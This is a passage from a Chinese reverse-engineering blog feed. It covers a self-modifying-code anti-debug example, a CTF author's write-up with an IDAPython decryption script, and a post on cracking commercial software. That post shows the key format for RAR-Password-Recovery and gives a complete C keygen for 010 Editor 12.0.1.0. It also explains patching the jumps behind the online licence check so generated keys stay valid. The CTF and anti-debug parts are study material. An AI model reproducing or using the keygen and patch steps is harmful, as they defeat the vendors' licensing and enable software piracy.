class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="comment">//将这个会被加密的函数放入SMC节区中，SMC节区的属性设置为ERW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg(<span class="meta-string">&quot;.SMC&quot;</span>);</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;this is a function&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> code_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/SECTION:.SMC,ERW&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span>* p,*q;</span><br><span class="line">p = func;</span><br><span class="line">q = func2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="comment">//printf(&quot;%x\n&quot;, p);</span></span><br><span class="line"><span class="comment">//printf(&quot;%x\n&quot;, q);</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)q - (<span class="keyword">int</span>)p; i++)</span><br><span class="line">&#123;</span><br><span class="line">*((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)p + i) = *((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)p + i) ^ <span class="number">5</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, *((<span class="keyword">unsigned</span> <span class="keyword">char</span>*)p + i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//50 8E E9 6D 05 34 45 05 ED 36 F5 FA FA 86 C1 01 58 C6 C9 C9 C9 C9 C9 C9 C9 C9 C9 C9 C9 C9 C9 C9</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Decode();</span><br><span class="line">func();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加密部分呢很简单就是一个异或，所以解密也是这个，如何实现的问题，上面的例子是通过获取函数地址来实现的，这也是为什么要关优化的原因。而且加了个SMC节区，主要是为了方便我们找到二进制文件的位置方便修改。编译的时候注意，在加密函数前加个断点，然后才开始执行，然后停止，然后将生成的exe，找到smc节区，去修改为加密后的数据，这样exe执行的时候就是解密了。</p><p>其实，还有中方法去定位到SMC节区，就是先把exe映射到内存，利用pe结构的知识点，找到smc节区，然后去加密解密。</p><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p><a href="https://syclover.feishu.cn/docs/doccnmKCtL4ABewkf89aAJXIdmg#J1tPpN">https://syclover.feishu.cn/docs/doccnmKCtL4ABewkf89aAJXIdmg#J1tPpN</a></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 《逆原》 </tag>
            
            <tag> 反调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Simple software cracking</title>
      <link href="2021/12/02/Simple%20software%20cracking/"/>
      <url>2021/12/02/Simple%20software%20cracking/</url>
      
        <content type="html"><![CDATA[<h1 id="Simple-software-cracking"><a href="#Simple-software-cracking" class="headerlink" title="Simple software cracking"></a>Simple software cracking</h1><p>之所以会产生这篇文章呢是一个学弟来问我RAR-Password-Recovery.exe<br>怎么逆，然后写注册机，然后就去看了看，然后后面又看到了看雪的一篇文章<a href="https://bbs.pediy.com/thread-270316.htm">https://bbs.pediy.com/thread-270316.htm</a>，逆010 editor，感觉还比较有意思，也去弄了弄。</p><p>西湖论剑的re就不写wp了，复现了没做起的两道，一道z3，一道爆破找txt，一道int 2d反调试的tea(tea加密的方式挺特别，第一次见，通过创造一段可执行的内存，然后模拟tea加密的单步汇编)，一道elf文件，动调分析如何加密。</p><p>期末复习开始。。。</p><h2 id="RAR-Password-Recovery-exe破解"><a href="#RAR-Password-Recovery-exe破解" class="headerlink" title="RAR-Password-Recovery.exe破解"></a>RAR-Password-Recovery.exe破解</h2><p>版本比较老，所以算法不是太难，并且只输入密钥。两种破解方式，一种暴力破解，一种逆算法，暴力破解就不说了，改改跳转就能过。</p><p>简单分析下算法，首先定位到我们输入的地方sub_4185D0。<br><img src="https://i.loli.net/2021/11/24/UWsjCauc9oERnk7.png"><br>接下来看看sub_417CE0<br><img src="https://i.loli.net/2021/11/24/urLgtadApbKx6NT.png"><br>所以只要key满足’DAOSSOFT-RAR-RECOVERY’+？？？？+’-‘就行，例如。<br><img src="https://i.loli.net/2021/11/24/otB5f48pLNOlSxb.png"></p><h2 id="010-editor-12-0-1-0"><a href="#010-editor-12-0-1-0" class="headerlink" title="010 editor 12.0.1.0"></a>010 editor 12.0.1.0</h2><p>破解的是x64的版本，x86有个地方一直都绕不过。。。</p><p>还是先定位到输入的函数，sub_7FF7C4B25130(QWidget **a1)。</p><p>看看这个函数里面成功注册的条件。<br><img src="https://i.loli.net/2021/11/30/lz6WjCeVq5QgXrF.png"><br>向上看看v17出现在哪<br><img src="https://i.loli.net/2021/12/01/apZQdmGMUkvuJ9f.png"><br>分析函数sub_7FF7C4936118，结合动调分析，看看什么地方牵扯到了<br>输入的用户名和注册码。</p><p>发现前面一部分都好像是在对用户名做了某些操作，但是对整体流程并没产生什么影响。真正有操作的是从103行开始的代码。<br><img src="https://i.loli.net/2021/12/02/gOQF1fRhXzq2tuU.png"><br>接下来看case 0xAC语句<br><img src="https://i.loli.net/2021/12/02/bx8dWSXHvTzysBw.png"><br>看LABEL_26。<br><img src="https://i.loli.net/2021/12/02/r9GM625nFcwIOYC.png"></p><p>现在我们来整理下，我们已经知道了那些内容。</p><pre><code>arr4=0xACsub_7FF7C493AC31返回值v23&lt;=0x3E8，且函数可逆sub_7FF7C49398D1返回值v29&gt;=v35(固定值，动调可得到)，且函数可逆sub_7FF7C4934B88会根据name，v23，v29产生一个4字节的int数据，然后和注册码的一部分进行比较。</code></pre><p>如何逆的问题。</p><p>先随便弄两个满足条件的v23和v29，利用sub_7FF7C4934B88()函数，产生4个字节的数，得到arr5<del>8。现在我们就知道了arr4</del>8，然后在根据sub_7FF7C493AC31和sub_7FF7C49398D1的可逆性，得到传入的参数，根据参数再来得到arr1~3和arr10。</p><p>写注册机。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> table[<span class="number">310</span>]=&#123;<span class="number">969622712</span>, <span class="number">594890599</span>, <span class="number">1593930257</span>, <span class="number">1052452058</span>, <span class="number">890701766</span>, <span class="number">1677293387</span>, <span class="number">394424968</span>, <span class="number">266815521</span>, <span class="number">1532978959</span>, <span class="number">1211194088</span>, <span class="number">2019260265</span>, <span class="number">729421127</span>, <span class="number">953225874</span>, <span class="number">1117854514</span>, <span class="number">892543556</span>, <span class="number">2000911200</span>, <span class="number">514538256</span>, <span class="number">1400963072</span>, <span class="number">486675118</span>, <span class="number">1862498216</span>, <span class="number">1136668818</span>, <span class="number">758909582</span>, <span class="number">1653935295</span>, <span class="number">821063674</span>, <span class="number">888606944</span>, <span class="number">687085563</span>, <span class="number">890056597</span>, <span class="number">1513495898</span>, <span class="number">365692427</span>, <span class="number">184357836</span>, <span class="number">677395407</span>, <span class="number">863045227</span>, <span class="number">818746596</span>, <span class="number">391985767</span>, <span class="number">1842768403</span>, <span class="number">758385145</span>, <span class="number">1478392706</span>, <span class="number">1985112985</span>, <span class="number">1552765320</span>, <span class="number">746944881</span>, <span class="number">368385984</span>, <span class="number">1758203153</span>, <span class="number">1240817244</span>, <span class="number">660489060</span>, <span class="number">756944316</span>, <span class="number">1290697955</span>, <span class="number">844453952</span>, <span class="number">288239112</span>, <span class="number">1769473626</span>, <span class="number">1922176006</span>, <span class="number">826636519</span>, <span class="number">391520695</span>, <span class="number">1081548223</span>, <span class="number">1069693142</span>, <span class="number">1244729994</span>, <span class="number">766313326</span>, <span class="number">1101031894</span>, <span class="number">624951698</span>, <span class="number">14501479</span>, <span class="number">1794907983</span>, <span class="number">1460682958</span>, <span class="number">1660839647</span>, <span class="number">1104890686</span>, <span class="number">897721119</span>, <span class="number">1442187162</span>, <span class="number">480708164</span>, <span class="number">454443986</span>, <span class="number">1064446153</span>, <span class="number">1595150448</span>, <span class="number">1041527979</span>, <span class="number">1145775470</span>, <span class="number">1399869657</span>, <span class="number">255985995</span>, <span class="number">802693350</span>, <span class="number">2005610078</span>, <span class="number">1897360642</span>, <span class="number">2146073193</span>, <span class="number">1538606632</span>, <span class="number">431647857</span>, <span class="number">964049561</span>, <span class="number">395138253</span>, <span class="number">19164808</span>, <span class="number">856904574</span>, <span class="number">730737943</span>, <span class="number">708645054</span>, <span class="number">1506870658</span>, <span class="number">933323739</span>, <span class="number">819349658</span>, <span class="number">1780571206</span>, <span class="number">236747382</span>, <span class="number">533160167</span>, <span class="number">2042104933</span>, <span class="number">670325172</span>, <span class="number">2040165158</span>, <span class="number">1354372994</span>, <span class="number">705785180</span>, <span class="number">1669754395</span>, <span class="number">1066536508</span>, <span class="number">1426207888</span>, <span class="number">1437950089</span>, <span class="number">741941201</span>, <span class="number">796931522</span>, <span class="number">1694313338</span>, <span class="number">1290302874</span>, <span class="number">1367672048</span>, <span class="number">2039808424</span>, <span class="number">1062939821</span>, <span class="number">954597728</span>, <span class="number">1668694488</span>, <span class="number">859122242</span>, <span class="number">1369582617</span>, <span class="number">140269649</span>, <span class="number">53024683</span>, <span class="number">729221831</span>, <span class="number">816609203</span>, <span class="number">736893191</span>, <span class="number">55706320</span>, <span class="number">262747091</span>, <span class="number">1629838835</span>, <span class="number">581764799</span>, <span class="number">1488480625</span>, <span class="number">1607077349</span>, <span class="number">1879925846</span>, <span class="number">1453945819</span>, <span class="number">1521965565</span>, <span class="number">856558562</span>, <span class="number">1530662365</span>, <span class="number">1230847072</span>, <span class="number">1404918182</span>, <span class="number">1281256849</span>, <span class="number">1238970765</span>, <span class="number">272453753</span>, <span class="number">1640907491</span>, <span class="number">2127893021</span>, <span class="number">350314733</span>, <span class="number">556617458</span>, <span class="number">654390256</span>, <span class="number">1648581270</span>, <span class="number">531062411</span>, <span class="number">1862873022</span>, <span class="number">1241517385</span>, <span class="number">1471028336</span>, <span class="number">5121143</span>, <span class="number">1444839026</span>, <span class="number">1183580211</span>, <span class="number">1573659650</span>, <span class="number">2018540230</span>, <span class="number">1487873223</span>, <span class="number">234237236</span>, <span class="number">898254600</span>, <span class="number">1023090193</span>, <span class="number">728843548</span>, <span class="number">2007454357</span>, <span class="number">1451820833</span>, <span class="number">267351539</span>, <span class="number">302982385</span>, <span class="number">26807015</span>, <span class="number">865879122</span>, <span class="number">664886158</span>, <span class="number">195503981</span>, <span class="number">1625037691</span>, <span class="number">1330347906</span>, <span class="number">1742434311</span>, <span class="number">1330272217</span>, <span class="number">1645368040</span>, <span class="number">542321916</span>, <span class="number">1782121222</span>, <span class="number">411042851</span>, <span class="number">435386250</span>, <span class="number">1176704752</span>, <span class="number">1454246199</span>, <span class="number">1136813916</span>, <span class="number">1707755005</span>, <span class="number">224415730</span>, <span class="number">201138891</span>, <span class="number">989750331</span>, <span class="number">1006010278</span>, <span class="number">1147286905</span>, <span class="number">406860280</span>, <span class="number">840388503</span>, <span class="number">1282017578</span>, <span class="number">1605698145</span>, <span class="number">23396724</span>, <span class="number">862145265</span>, <span class="number">1898780916</span>, <span class="number">1855549801</span>, <span class="number">1571519230</span>, <span class="number">2083204840</span>, <span class="number">1859876276</span>, <span class="number">1602449334</span>, <span class="number">1009413590</span>, <span class="number">690816450</span>, <span class="number">86131931</span>, <span class="number">345661263</span>, <span class="number">1565025600</span>, <span class="number">857544170</span>, <span class="number">1329948960</span>, <span class="number">1211787679</span>, <span class="number">994381573</span>, <span class="number">991984748</span>, <span class="number">1956475134</span>, <span class="number">1098146294</span>, <span class="number">1655714289</span>, <span class="number">659576699</span>, <span class="number">689116467</span>, <span class="number">1485584392</span>, <span class="number">451884118</span>, <span class="number">255590636</span>, <span class="number">2108114754</span>, <span class="number">1266252396</span>, <span class="number">1589326471</span>, <span class="number">2019907768</span>, <span class="number">15552498</span>, <span class="number">1651075358</span>, <span class="number">614606175</span>, <span class="number">1656823678</span>, <span class="number">797605325</span>, <span class="number">1681594366</span>, <span class="number">2005080248</span>, <span class="number">624648446</span>, <span class="number">884695971</span>, <span class="number">1526931791</span>, <span class="number">1595240948</span>, <span class="number">439447199</span>, <span class="number">2060396292</span>, <span class="number">680093752</span>, <span class="number">409028215</span>, <span class="number">469068267</span>, <span class="number">195583689</span>, <span class="number">1791650630</span>, <span class="number">507724330</span>, <span class="number">1364025102</span>, <span class="number">1094582668</span>, <span class="number">813049577</span>, <span class="number">32316922</span>, <span class="number">1240756058</span>, <span class="number">1176200235</span>, <span class="number">2104494066</span>, <span class="number">325396055</span>, <span class="number">1796606917</span>, <span class="number">1709197385</span>, <span class="number">525495836</span>, <span class="number">1510101430</span>, <span class="number">735526761</span>, <span class="number">767523533</span>, <span class="number">1374043776</span>, <span class="number">1559389967</span>, <span class="number">567085571</span>, <span class="number">1560216161</span>, <span class="number">867042846</span>, <span class="number">1001796703</span>, <span class="number">1568754293</span>, <span class="number">628841972</span>, <span class="number">173812827</span>, <span class="number">379868455</span>, <span class="number">384973125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">char</span> *name, <span class="keyword">int</span> flag, <span class="keyword">char</span> a3, <span class="keyword">char</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v5;</span><br><span class="line"><span class="keyword">unsigned</span> __int8 v9,v10,v11,v12;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v13;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *v14;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *v16;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v15;</span><br><span class="line"><span class="keyword">int</span> v17,v18,v19;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> len,i;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v5 = <span class="number">0</span>;</span><br><span class="line">len=<span class="built_in">strlen</span>(name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v9 = <span class="number">0</span>;</span><br><span class="line">v10 = <span class="number">15</span> * a4;</span><br><span class="line">v11 = <span class="number">0</span>;</span><br><span class="line">v12 = <span class="number">17</span> * a3;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">&#123;</span><br><span class="line">v13 = <span class="built_in">toupper</span>(name[i]);</span><br><span class="line">v14 = &amp;table[v12];</span><br><span class="line">v15 = v5 + table[v13];</span><br><span class="line">v16 = &amp;table[v10];</span><br><span class="line"></span><br><span class="line">v17 = table[(<span class="keyword">unsigned</span> __int8)(v13 + <span class="number">13</span>)];</span><br><span class="line">        v18 = (<span class="keyword">unsigned</span> __int8)(v13 + <span class="number">47</span>);</span><br><span class="line">        v19 = v9;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">v12 += <span class="number">9</span>;</span><br><span class="line">v10 += <span class="number">13</span>;</span><br><span class="line">v9 += <span class="number">19</span>;</span><br><span class="line">v11 += <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">v5 = *v16 + *v14 + table[v19] + table[v18] * (v15 ^ v17);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> v23=<span class="number">0x23</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> v29=<span class="number">0x5002</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> back,temp;</span><br><span class="line"><span class="keyword">char</span> name[]=<span class="string">&quot;The_Itach1&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> __int16 arr12;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> arr089;</span><br><span class="line"></span><br><span class="line">back=func(name,<span class="number">1</span>,<span class="keyword">char</span>(v29),v23);</span><br><span class="line"></span><br><span class="line">temp=back;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">key[i+<span class="number">4</span>]=temp&amp;<span class="number">0xff</span>;</span><br><span class="line">temp=temp&gt;&gt;<span class="number">8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">key[<span class="number">3</span>]=<span class="number">0xAC</span>;</span><br><span class="line"></span><br><span class="line">arr12=(<span class="keyword">unsigned</span> __int16) (((v23*<span class="number">0xB</span>) ^ <span class="number">0x3421</span>)<span class="number">-19760</span>)^ <span class="number">0x7892</span>;</span><br><span class="line"></span><br><span class="line">key[<span class="number">2</span>]=(arr12&amp;<span class="number">0xff</span>)^key[<span class="number">5</span>];</span><br><span class="line">key[<span class="number">1</span>]=((arr12&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)^key[<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">arr089=((((v29*<span class="number">0x11</span>)&amp;<span class="number">0xffffff</span>) ^ <span class="number">0xFFE53167</span> )+ <span class="number">180597</span>) ^  <span class="number">0x22C078</span> ^<span class="number">0x5B8C27</span>;</span><br><span class="line">key[<span class="number">0</span>]=arr089&amp;<span class="number">0xff</span> ^ key[<span class="number">6</span>];</span><br><span class="line">key[<span class="number">8</span>]=(arr089&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span> ^ key[<span class="number">4</span>];</span><br><span class="line">key[<span class="number">9</span>]=(arr089&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span> ^ key[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;name: %s\nkey: &quot;</span>,name); </span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>,key[i]);</span><br><span class="line">&#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>开始的时候，有免费30天的时候是显示注册成功的，但是在后面，出现了问题，被检测到了是无效证书，后面继续分析发现是*(_DWORD *)(qword_7FF7C562EE50 + 60)的问题，当这个地址的值为1时就会使sub_7FF7C49384F4函数返回错误的值，而且会造成进入下面的if判断，根据调试分析，里面应该是个网络检测，会访问010editor的某个网站之类的，然后返回一个值，被检测为无效指令。</p><p>跟进sub_7FF7C4C7C320，发现这里修改了*(_DWORD *)(qword_7FF7C562EE50 + 60)的值。<br><img src="https://i.loli.net/2021/12/02/6lSputv8VA4Hyha.png"></p><p>也不想一步步再调试，然后让这个函数返回正确的值，所以我决定直接改跳转，将与*(_DWORD *)(qword_7FF7C562EE50 + 60)相关的两个跳转该成相反的就行了。</p><p>sub_7FF7C4C7AD70函数中的*(_DWORD <em>)(qword_7FF7C562EE50 + 60)<br><img src="https://i.loli.net/2021/12/02/BaetfwHvL4WQSbT.png"><br>sub_7FF7C4B25130函数中的</em>(_DWORD *)(qword_7FF7C562EE50 + 60)<br><img src="https://i.loli.net/2021/12/02/IFR67tqpfNLKoa1.png"><br>之后就可以随便使用注册机注册了。<br><img src="https://i.loli.net/2021/12/02/ATrc1ebPwSWuni6.png"></p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安洵杯线上re出题总结</title>
      <link href="2021/11/30/%E5%AE%89%E6%B4%B5%E7%BA%BF%E4%B8%8Are%E5%87%BA%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>2021/11/30/%E5%AE%89%E6%B4%B5%E7%BA%BF%E4%B8%8Are%E5%87%BA%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="安洵杯线上re出题总结"><a href="#安洵杯线上re出题总结" class="headerlink" title="安洵杯线上re出题总结"></a>安洵杯线上re出题总结</h1><p>第一次出题，也是第一次在后台可以看到解题情况和赛后wp，对这次的题目做个总结，怎么说呢，不太喜欢出一些很恶心的题，所以选了还算比较简单的考点，根据从一开始的解题情况，re部分的题还是有难度的，一直到下午1点多，都还只有一个re解，但到中期，做出sign_in的人开始多了起来，然后可能py也多了点(可能思路被传出去了吧)，后来也被打爆了，至于virus，这道题关键就是key怎么求，但是我看了部分队伍的wp后，key的由来的没讲清楚，所以懂得都懂。。。个人认为两道题还行，大家都可以学到东西，至少不坐牢。</p><p>后面准备写篇010editor的破解，然后就复习了，再不复习就挂科了。。。寒假在来总结和学习其他的。</p><h2 id="sign-in"><a href="#sign-in" class="headerlink" title="sign_in"></a>sign_in</h2><p>考点：smc+花指令+数组内异或+W型的栅栏加密(比较难看)+魔改xxtea。</p><p>32位程序，无壳，打开发现是无法吃到食物的贪吃蛇游戏，ida打开，shift 12可以看到一些关键字符串，但是无法交叉引用。</p><p>定位到main函数，发现sub_40100F函数有花，点进去看看。<br><img src="https://i.loli.net/2021/11/30/jEPlkU2esC9Zgy5.png"><br>去花后，发现就是对0x401D10地址开始的后0x256个字节进行异或0x37解密。<br><img src="https://i.loli.net/2021/11/30/BND9n5MHw6pyjIZ.png"><br>所以两个方法，一是直接动调自解密，二是直接idapython还原静态分析，实际上动调会更好，确保堆栈平衡的情况下在0x401D10直接set ip动调分析，下面也给一个idapython还原脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line">st = <span class="number">0x401D10</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> st &lt;= <span class="number">0x401D10</span>+<span class="number">0x245</span>:</span><br><span class="line">    value = ida_bytes.get_byte(st)</span><br><span class="line">    value ^= <span class="number">55</span></span><br><span class="line">    ida_bytes.patch_byte(st, value)</span><br><span class="line">    st += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>接下来分析0x401D10函数。<br><img src="https://i.loli.net/2021/11/30/YzZe65vDwiIFnR9.png"><br>至于rand()%256的由来在这，也就是食物的判断，当食物等于rand()%256时才会进入输入flag的函数。<br><img src="https://i.loli.net/2021/11/30/lQzFfsIaZ9752Vm.png"></p><p>然后解题就先爆破256可能，得到food==77是正确的，然后进行W型栅栏解密，实际上看不懂也没关系，直接测试flag，得到变换顺序，只不过由于前面有个数组内异或，所以可能会造成多义性，所以动调时，跳过数组内异或就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc=[<span class="number">0x00000061</span>, <span class="number">0x00000067</span>, <span class="number">0x0000006D</span>, <span class="number">0x00000073</span>, <span class="number">0x00000079</span>, <span class="number">0x00000035</span>, <span class="number">0x00000062</span>, <span class="number">0x00000066</span>,</span><br><span class="line">    <span class="number">0x00000068</span>, <span class="number">0x0000006C</span>, <span class="number">0x0000006E</span>, <span class="number">0x00000072</span>, <span class="number">0x00000074</span>, <span class="number">0x00000078</span>, <span class="number">0x0000007A</span>, <span class="number">0x00000034</span>,</span><br><span class="line">    <span class="number">0x00000036</span>, <span class="number">0x00000063</span>, <span class="number">0x00000065</span>, <span class="number">0x00000069</span>, <span class="number">0x0000006B</span>, <span class="number">0x0000006F</span>, <span class="number">0x00000071</span>, <span class="number">0x00000075</span>,</span><br><span class="line">    <span class="number">0x00000077</span>, <span class="number">0x00000031</span>, <span class="number">0x00000033</span>, <span class="number">0x00000064</span>, <span class="number">0x0000006A</span>, <span 